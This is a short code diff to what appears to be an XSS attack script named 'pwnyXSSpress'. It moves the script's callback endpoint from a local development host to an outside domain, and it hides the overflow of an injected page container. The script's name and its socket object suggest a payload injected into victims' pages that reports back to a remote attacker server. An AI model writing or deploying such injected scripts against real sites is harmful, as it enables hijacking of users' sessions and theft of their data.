@@ -2,7 +2,7 @@
 
 var pwny = {
 	debug: false,
-	endpoint: 'http://whak.local.dev/pwnyXSSpress/server.php',
+	endpoint: 'http://mentally-defective.com/pwnyXSSpress/server.php',
 	recving: false,
 	errno: 0,
 
@@ -161,6 +161,7 @@ var pwnySocket = function (endpoint){
 		this.container.style.top = '0px';
 		this.container.style.right = '0px';
 		this.container.style.position = 'absolute';
+		this.container.style.overflow = 'hidden';
 	}
 	
 	document.body.appendChild(this.container);
